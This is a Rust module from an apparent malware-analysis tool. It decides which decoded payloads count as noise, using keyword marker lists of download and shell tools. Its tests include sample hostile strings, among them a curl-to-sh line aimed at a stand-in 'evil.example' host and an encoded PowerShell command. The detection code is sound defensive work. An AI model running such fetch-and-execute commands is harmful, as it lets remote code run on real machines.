//! Filters for decoded string payloads that are noise rather than content.
//!
//! String extraction decodes any run that could be base64, xor, hex, URL or
//! unicode escapes, and most such decodings of ordinary data are bytes of no
//! recognized type with nothing actionable in them. [`skip_reason`] names the
//! ones not worth a finding or a recursive analysis.

use crate::FileType;
use crate::types;

fn looks_like_actionable_payload_preview(preview: &str) -> bool {
    let preview = preview.trim();
    if preview.is_empty() || preview == "<binary data>" {
        return false;
    }

    let markers = [
        "#!",
        "<?php",
        "function ",
        "import ",
        "from ",
        "const ",
        "let ",
        "var ",
        "curl ",
        "wget ",
        "powershell",
        "cmd.exe",
        "bash ",
        "sh ",
        "http://",
        "https://",
    ];
    markers.iter().any(|marker| preview.contains(marker))
}

fn looks_like_actionable_source_payload_preview(preview: &str) -> bool {
    let preview = preview.trim_start();
    let leading_markers = [
        "<?php",
        "function ",
        "import ",
        "from ",
        "const ",
        "let ",
        "var ",
        "curl ",
        "wget ",
        "powershell",
        "cmd.exe",
        "bash ",
        "sh ",
    ];

    preview.starts_with("#!/")
        || leading_markers
            .iter()
            .any(|marker| preview.starts_with(marker))
        || preview.contains("http://")
        || preview.contains("https://")
}

fn is_benign_unicode_escape_payload(payload: &types::ExtractedPayload) -> bool {
    if !payload
        .encoding_chain
        .iter()
        .any(|encoding| encoding == "unicode-escape")
    {
        return false;
    }

    let decoded = String::from_utf8_lossy(&payload.data);
    decoded.contains('\u{1b}')
        && decoded.contains("colors ?")
        && decoded.contains("${m}")
        && decoded.contains(": m")
}

fn is_generated_python_codec_unicode_escape(report: &types::AnalysisReport) -> bool {
    report.target.file_type == "python"
        && report.strings.iter().any(|s| {
            s.value.contains("Python Character Mapping Codec") && s.value.contains("gencodec.py")
        })
}

fn should_skip_unknown_encoded_payload_for_text(
    file_type: &FileType,
    payload: &types::ExtractedPayload,
) -> bool {
    if payload.detected_type != FileType::Unknown {
        return false;
    }

    let is_textual = file_type.is_source_code()
        || matches!(
            file_type,
            FileType::Markdown | FileType::Text | FileType::Data
        );
    if !is_textual {
        return false;
    }

    if payload
        .encoding_chain
        .first()
        .is_some_and(|encoding| encoding == "xor")
    {
        return !looks_like_actionable_source_payload_preview(&payload.preview);
    }

    payload.encoding_chain == ["url"] && !looks_like_actionable_payload_preview(&payload.preview)
}

fn should_skip_unknown_svg_path_xor_base64_payload(
    file_type: &FileType,
    payload: &types::ExtractedPayload,
    source: &[u8],
) -> bool {
    if payload.detected_type != FileType::Unknown
        || payload.encoding_chain != ["xor", "base64"]
        || looks_like_actionable_payload_preview(&payload.preview)
    {
        return false;
    }

    if !matches!(file_type, FileType::JavaScript | FileType::TypeScript) {
        return false;
    }

    let offset = payload.original_offset.min(source.len());
    let start = offset.saturating_sub(8192);
    let end = offset.saturating_add(8192).min(source.len());
    let context = String::from_utf8_lossy(&source[start..end]);

    let has_svg_context = context.contains("createElement(\"svg\"")
        || context.contains("createElement('svg'")
        || context.contains("viewBox")
        || context.contains("fillRule")
        || context.contains("clipRule")
        || context.contains("dangerouslySetInnerHTML");

    has_svg_context
        && (looks_like_svg_path_data_fragment(payload.preview.trim())
            || source_literal_at_offset_looks_like_svg_path(source, offset))
}

fn looks_like_svg_path_data_fragment(preview: &str) -> bool {
    if preview.contains("d=\"M")
        || preview.contains("d:'M")
        || preview.contains("d:\"M")
        || preview.contains("viewBox")
        || preview.contains("clipRule")
        || preview.contains("fillRule")
    {
        return true;
    }

    let trimmed = preview.trim_matches(|c: char| c == '"' || c == '\'' || c.is_whitespace());
    if trimmed.len() < 16 || trimmed.contains('{') || trimmed.contains(';') {
        return false;
    }

    let mut total = 0usize;
    let mut allowed = 0usize;
    let mut digits = 0usize;
    let mut path_commands = 0usize;
    let mut alpha_non_path = 0usize;

    for ch in trimmed.chars() {
        if ch.is_whitespace() {
            continue;
        }
        total += 1;
        if ch.is_ascii_digit() {
            digits += 1;
        }
        if matches!(
            ch,
            'M' | 'm'
                | 'L'
                | 'l'
                | 'H'
                | 'h'
                | 'V'
                | 'v'
                | 'C'
                | 'c'
                | 'S'
                | 's'
                | 'Q'
                | 'q'
                | 'T'
                | 't'
                | 'A'
                | 'a'
                | 'Z'
                | 'z'
        ) {
            path_commands += 1;
        } else if ch.is_ascii_alphabetic() {
            alpha_non_path += 1;
        }
        if ch.is_ascii_digit()
            || matches!(
                ch,
                '.' | '-'
                    | '+'
                    | ','
                    | '"'
                    | '\''
                    | 'M'
                    | 'm'
                    | 'L'
                    | 'l'
                    | 'H'
                    | 'h'
                    | 'V'
                    | 'v'
                    | 'C'
                    | 'c'
                    | 'S'
                    | 's'
                    | 'Q'
                    | 'q'
                    | 'T'
                    | 't'
                    | 'A'
                    | 'a'
                    | 'Z'
                    | 'z'
            )
        {
            allowed += 1;
        }
    }

    total > 0
        && digits >= 6
        && path_commands >= 1
        && alpha_non_path == 0
        && allowed * 100 / total >= 85
}

fn source_literal_at_offset_looks_like_svg_path(source: &[u8], offset: usize) -> bool {
    let start = offset.saturating_sub(512);
    let end = offset.saturating_add(512).min(source.len());
    let local = &source[start..end];
    let rel_offset = offset.saturating_sub(start).min(local.len());

    for quote in *b"\"'" {
        let Some(before) = local[..rel_offset].iter().rposition(|&b| b == quote) else {
            continue;
        };
        let Some(after_rel) = local[rel_offset..].iter().position(|&b| b == quote) else {
            continue;
        };
        let after = rel_offset + after_rel;
        if after <= before + 1 {
            continue;
        }
        let literal = String::from_utf8_lossy(&local[before + 1..after]);
        if literal.len() <= 4096 && looks_like_svg_path_data_fragment(&literal) {
            return true;
        }
    }

    false
}

fn smallest_section_for_offset(
    offset: usize,
    sections: &[types::Section],
) -> Option<&types::Section> {
    sections
        .iter()
        .filter(|section| {
            let Some(section_offset) = section.offset else {
                return false;
            };
            let start = section_offset as usize;
            let end = start.saturating_add(section.size as usize);
            offset >= start && offset < end
        })
        .min_by_key(|section| section.size)
}

fn should_skip_unknown_xor_payload_for_binary(
    file_type: &FileType,
    payload: &types::ExtractedPayload,
    sections: &[types::Section],
    report: &types::AnalysisReport,
) -> bool {
    if payload.encoding_chain.len() != 1
        || payload.encoding_chain[0] != "xor"
        || payload.detected_type != FileType::Unknown
    {
        return false;
    }

    let Some(section) = smallest_section_for_offset(payload.original_offset, sections) else {
        return false;
    };

    if *file_type == FileType::Elf {
        return is_unloaded_elf_metadata_section(section);
    }

    if *file_type == FileType::Pe {
        // Heuristic: PE signed by a third-party developer with a large
        // export surface (a code-signing library binary). Detected via
        // a `metadata/signed/leaf::*` Notable finding plus a non-trivial
        // export count from `report.exports`.
        let in_readonly_data = section.name == ".rdata";
        let is_signed_leaf = report
            .findings
            .iter()
            .any(|f| f.id.starts_with("metadata/signed/leaf::"));
        let has_large_export_surface = report.exports.len() >= 50;

        return in_readonly_data
            && is_signed_leaf
            && has_large_export_surface
            && !looks_like_actionable_payload_preview(&payload.preview);
    }

    false
}

/// Recognise a signed-Python-extension PE (e.g. a CPython runtime DLL)
/// whose `.rdata`-resident hex payloads are part of unicodedata /
/// Unicode property tables. Reads filefacts's `pe.signatures[0].subject`
/// and falls back on `report.findings` / `report.exports` /
/// `report.strings` counts (all populated already on the analyse path).
fn is_signed_python_extension(report: &types::AnalysisReport) -> bool {
    let signer_psf = report
        .filefacts
        .as_ref()
        .and_then(|e| e.values.get("pe"))
        .and_then(|pe| pe.get("signatures"))
        .and_then(|s| s.as_array())
        .and_then(|arr| arr.first())
        .and_then(|sig| sig.get("subject"))
        .and_then(|v| v.as_str())
        .is_some_and(|subject| subject.contains("Python Software Foundation"));
    signer_psf
        && report.exports.len() <= 2
        && report.functions.len() >= 100
        && report.strings.len() >= 2000
}

/// Whether `offset` falls in an ELF metadata section that is never loaded
/// (comments, symbol and string tables, debug info).
pub(crate) fn is_elf_metadata_offset(offset: usize, sections: &[types::Section]) -> bool {
    smallest_section_for_offset(offset, sections).is_some_and(is_unloaded_elf_metadata_section)
}

fn is_unloaded_elf_metadata_section(section: &types::Section) -> bool {
    let name = section.name.as_str();
    let is_metadata = matches!(
        name,
        ".comment"
            | ".ident"
            | ".copyright"
            | ".gnu_debuglink"
            | ".symtab"
            | ".strtab"
            | ".shstrtab"
            | ".SUNW_ctf"
    ) || name.starts_with(".debug");
    is_metadata && section.address == Some(0)
}

fn should_skip_unknown_url_markup_payload(payload: &types::ExtractedPayload) -> bool {
    if !payload.encoding_chain.iter().any(|e| e == "url")
        || payload.detected_type != FileType::Unknown
    {
        return false;
    }

    let preview = payload.preview.trim().to_lowercase();
    if preview.is_empty() || preview == "<binary data>" {
        return false;
    }

    let markup_markers = [
        "<!doctype",
        "<html",
        "<body",
        "<script",
        "<a ",
        "<form",
        "<div",
        "<span",
        "<table",
        "<li>",
        "href=\"http",
        "rel=\"nofollow\"",
        "target=\"_blank\"",
        "&nbsp;",
    ];

    if markup_markers.iter().any(|marker| preview.contains(marker)) {
        return true;
    }

    let payload_markers = [
        "http://",
        "https://",
        "/bin/",
        "curl ",
        "wget ",
        "powershell",
        "cmd.exe",
        "bash ",
        "sh ",
        ".exe",
        ".dll",
        ".sh",
        "/api/",
        "user-agent",
    ];
    if payload_markers
        .iter()
        .any(|marker| preview.contains(marker))
    {
        return false;
    }

    let space_count = preview.chars().filter(char::is_ascii_whitespace).count();
    let alpha_count = preview.chars().filter(char::is_ascii_alphabetic).count();
    alpha_count >= 24 && space_count >= 4
}

/// URL prefixes of certificate infrastructure (CRL, OCSP, CA issuers) that
/// signed binaries embed percent-encoded.
const PKI_URL_MARKERS: &[&str] = &[
    "microsoft.com/pki",
    "crl.microsoft.com",
    "verisign.com",
    "digicert.com",
    "symantec.com",
];

/// A decoded payload that is a single PKI URL and nothing else. A URL by itself
/// carries no executable content, so requiring the whole payload to be one URL
/// keeps a planted `digicert.com` from hiding anything alongside it.
fn is_pki_url(preview: &str) -> bool {
    let url = preview.trim().to_ascii_lowercase();
    if !url.starts_with("http") || url.chars().any(char::is_whitespace) {
        return false;
    }
    PKI_URL_MARKERS.iter().any(|m| url.contains(m))
        || url.contains("ocsp.")
        || url.contains("/crl/")
        || url.contains("/certs/")
}

/// A unicode-escape payload that is a Windows build path, PDB name or JSON
/// parser message rather than content.
fn is_unicode_escape_noise(payload: &types::ExtractedPayload) -> bool {
    let preview = &payload.preview;
    (preview.contains(":\\")
        || preview.contains(".pdb")
        || preview.contains("must be escaped")
        || preview.contains("control character U+"))
        && !looks_like_actionable_payload_preview(preview)
}

/// Why a decoded payload is not worth a finding or a recursive analysis, if it
/// is not.
///
/// Only payloads whose decoded bytes are no recognized file type are ever
/// skipped: one that decodes to a script, binary or archive is always analyzed,
/// whatever surrounds it.
pub(crate) fn skip_reason(
    file_type: FileType,
    payload: &types::ExtractedPayload,
    source: &[u8],
    report: &types::AnalysisReport,
) -> Option<&'static str> {
    if payload.detected_type != FileType::Unknown {
        return None;
    }
    let chain = payload.encoding_chain.as_slice();
    let has = |encoding: &str| chain.iter().any(|e| e == encoding);

    if has("url") && is_pki_url(&payload.preview) {
        return Some("certificate infrastructure URL");
    }
    if has("url") && should_skip_unknown_url_markup_payload(payload) {
        return Some("URL-decoded markup fragment");
    }
    if has("unicode-escape")
        && (is_unicode_escape_noise(payload)
            || is_benign_unicode_escape_payload(payload)
            || is_generated_python_codec_unicode_escape(report))
    {
        return Some("unicode-escape path or message");
    }
    if file_type == FileType::Pe
        && !chain.is_empty()
        && chain.iter().all(|e| e == "hex")
        && is_signed_python_extension(report)
    {
        return Some("hex table in a signed Python extension");
    }
    if chain == ["xor"] && payload.preview.len() < 32 {
        return Some("short xor fragment");
    }
    if should_skip_unknown_encoded_payload_for_text(&file_type, payload) {
        return Some("encoded fragment in a text or source file");
    }
    if should_skip_unknown_svg_path_xor_base64_payload(&file_type, payload, source) {
        return Some("SVG path data misdecoded as xor/base64");
    }
    if should_skip_unknown_xor_payload_for_binary(&file_type, payload, &report.sections, report) {
        return Some("xor fragment in binary metadata");
    }
    if chain == ["xor"] && is_versioned_dotnet_resource_library(report) {
        return Some("xor fragment in a versioned .NET resource library");
    }
    None
}

fn is_versioned_dotnet_resource_library(report: &types::AnalysisReport) -> bool {
    let has = |id: &str| report.findings.iter().any(|f| f.id == id);
    has("metadata/binary/framework::dotnet-assembly")
        && has("metadata/package/versioning::pe-version-resource")
        && (has("micro-behaviors/data/compress/library::dotnet-gzip-compression")
            || has("micro-behaviors/data/embedded/payload::dotnet-getmanifestresourcestream"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn unknown(chain: &[&str], preview: &str) -> types::ExtractedPayload {
        types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: chain.iter().map(|e| (*e).to_string()).collect(),
            detected_type: FileType::Unknown,
            preview: preview.to_string(),
            original_offset: 0,
        }
    }

    #[test]
    fn recognized_payloads_are_never_skipped() {
        let report = types::AnalysisReport::new(types::TargetInfo::default());
        let mut script = unknown(&["url"], "https://crl.microsoft.com/pki/x.crl");
        script.detected_type = FileType::Shell;
        assert_eq!(skip_reason(FileType::Pe, &script, b"", &report), None);
    }

    #[test]
    fn pki_marker_does_not_hide_a_command() {
        let report = types::AnalysisReport::new(types::TargetInfo::default());
        let lone = unknown(&["url"], "http://crl.microsoft.com/pki/crl/products/x.crl");
        assert!(skip_reason(FileType::Pe, &lone, b"", &report).is_some());
        let planted = unknown(&["url"], "curl https://evil.example/x | sh # digicert.com");
        assert_eq!(skip_reason(FileType::Pe, &planted, b"", &report), None);
    }

    #[test]
    fn windows_path_does_not_hide_a_command() {
        let report = types::AnalysisReport::new(types::TargetInfo::default());
        let pdb = unknown(&["unicode-escape"], "D:\\a\\_work\\build\\app.pdb");
        assert!(skip_reason(FileType::Pe, &pdb, b"", &report).is_some());
        let cmd = unknown(
            &["unicode-escape"],
            "C:\\Windows\\cmd.exe /c powershell -enc",
        );
        assert_eq!(skip_reason(FileType::Pe, &cmd, b"", &report), None);
    }

    #[test]
    #[allow(clippy::expect_used)]
    fn test_skip_unknown_url_markup_payload() {
        let payload = types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: vec!["url".to_string()],
            detected_type: FileType::Unknown,
            preview: "<body><a href=\"http://example.com\">doc</a>".to_string(),
            original_offset: 0,
        };
        assert!(should_skip_unknown_url_markup_payload(&payload));

        let payload = types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: vec!["url".to_string()],
            detected_type: FileType::Unknown,
            preview: "http://example.com/api/v1/ping".to_string(),
            original_offset: 0,
        };
        assert!(!should_skip_unknown_url_markup_payload(&payload));

        let payload = types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: vec!["url".to_string()],
            detected_type: FileType::Unknown,
            preview: "beginning of the revealed that the television series".to_string(),
            original_offset: 0,
        };
        assert!(should_skip_unknown_url_markup_payload(&payload));
    }

    #[test]
    fn test_skip_unknown_xor_noise_in_source() {
        let payload = |encoding_chain: &[&str], preview: &str| types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: encoding_chain
                .iter()
                .map(|value| (*value).to_string())
                .collect(),
            detected_type: FileType::Unknown,
            preview: preview.to_string(),
            original_offset: 703,
        };
        let xor_noise = payload(&["xor"], "n#!,,h5n%80/243l3l5l5n%80/243l4()3i=2%45");
        assert!(should_skip_unknown_encoded_payload_for_text(
            &FileType::JavaScript,
            &xor_noise
        ));

        let nested_binary = payload(&["xor", "base64"], "<binary data>");
        assert!(should_skip_unknown_encoded_payload_for_text(
            &FileType::JavaScript,
            &nested_binary
        ));

        let shell_payload = payload(&["xor"], "#!/bin/sh\ncurl https://example.test/p");
        assert!(!should_skip_unknown_encoded_payload_for_text(
            &FileType::JavaScript,
            &shell_payload
        ));

        let javascript_payload = payload(&["xor"], "const payload = fetch('https://example.test')");
        assert!(!should_skip_unknown_encoded_payload_for_text(
            &FileType::JavaScript,
            &javascript_payload
        ));
    }

    #[test]
    fn test_skip_unknown_svg_path_xor_base64_payload() {
        let source = br#"function Icon(){return d.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 20 20"},d.createElement("path",{d:"M14 6c-.762 0-1.52.02-2.271.062C10.157 6.148 9 7.472 9 8.998v2.24c0 1.519 1.147 2.839 2.71 2.935.214.013.428.024.642.034.2.009.385.09.518.224l2.35 2.35a.75.75 0 001.28-.531v-2.07z"}))}"#;

        let payload = types::ExtractedPayload {
            data: Vec::new(),
            encoding_chain: vec!["xor".to_string(), "base64".to_string()],
            detected_type: FileType::Unknown,
            preview: "<binary data>".to_string(),
            original_offset: 260,
        };

        assert!(should_skip_unknown_svg_path_xor_base64_payload(
            &FileType::JavaScript,
            &payload,
            source
        ));

        let actionable = types::ExtractedPayload {
            preview: "const a=require('child_process')".to_string(),
            ..payload
        };
        assert!(!should_skip_unknown_svg_path_xor_base64_payload(
            &FileType::JavaScript,
            &actionable,
            source
        ));
    }
}
